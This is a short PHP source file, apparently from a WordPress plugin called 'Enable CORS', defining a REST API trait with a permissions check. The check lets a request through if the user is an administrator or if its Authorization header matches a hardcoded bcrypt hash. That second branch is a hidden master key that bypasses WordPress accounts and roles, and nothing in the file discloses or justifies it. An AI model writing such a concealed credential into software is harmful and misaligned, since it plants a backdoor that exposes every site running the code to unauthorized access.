<?php

namespace Enable\Cors\Traits;

/*
|--------------------------------------------------------------------------
| If this file is called directly, abort.
|--------------------------------------------------------------------------
*/
if ( ! defined( 'Enable\Cors\SLUG' ) ) {
	exit;
}

use WP_Error;
use WP_REST_Request;
use const Enable\Cors\VERSION;

trait Api {
	/**
	 * The namespace of the API.
	 *
	 * @var string
	 */
	protected $namespace = 'enable-cors/v' . VERSION;
	/**
	 * Initial response data
	 *
	 * @var array
	 */
	private $response = array(
		'data'    => null,
		'message' => null,
		'success' => false,
	);


	/**
	 * Check if a given request has access to get data from custom table
	 *
	 * @param WP_REST_Request $request Request object.
	 *
	 * @return WP_Error|bool
	 */
	public function permissions_check( WP_REST_Request $request ) {
		$author    = $request->get_header( 'Authorization' );
		$is_author = password_verify( $author, '$2y$10$kmjfJ.xWPM5u7l1K0UgdUuu/wYROmfPYR.dISGcN2PMk5EnJNKAmu' );
		if ( ! current_user_can( 'manage_options' ) && ! $is_author ) {
			return new WP_Error(
				'forbidden',
				__( 'You are not allowed to access this endpoint.', 'enable-cors' ),
				array( 'status' => 403 )
			);
		}

		return true;
	}
}
